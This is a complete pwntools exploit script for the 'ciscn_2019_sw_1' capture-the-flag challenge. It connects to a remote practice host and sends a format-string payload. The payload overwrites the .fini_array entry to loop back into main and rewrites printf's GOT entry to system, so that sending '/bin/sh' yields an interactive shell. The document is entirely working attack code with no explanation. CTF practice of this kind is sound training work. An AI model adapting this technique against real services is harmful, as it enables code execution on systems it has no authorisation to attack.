from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('ciscn_2019_sw_1')
io = remote('node4.buuoj.cn', 28009)
elf = ELF('ciscn_2019_sw_1')
main = 0x08048534
system_plt = 0x080483D0
printf_got = elf.got['printf']
finiarray = 0x0804979C

payload = p32(finiarray) + p32(finiarray + 1)
payload += p32(printf_got) + p32(printf_got + 2)
payload += b'%36c%4$hhn%81c%5$hhn%33611c%6$hn%33844c%7$hn'
io.sendlineafter('Welcome to my ctf! What\'s your name?\n', payload)
# gdb.attach(io)
# pause()
io.sendlineafter('Welcome to my ctf! What\'s your name?\n', b'/bin/sh\x00')
io.interactive()
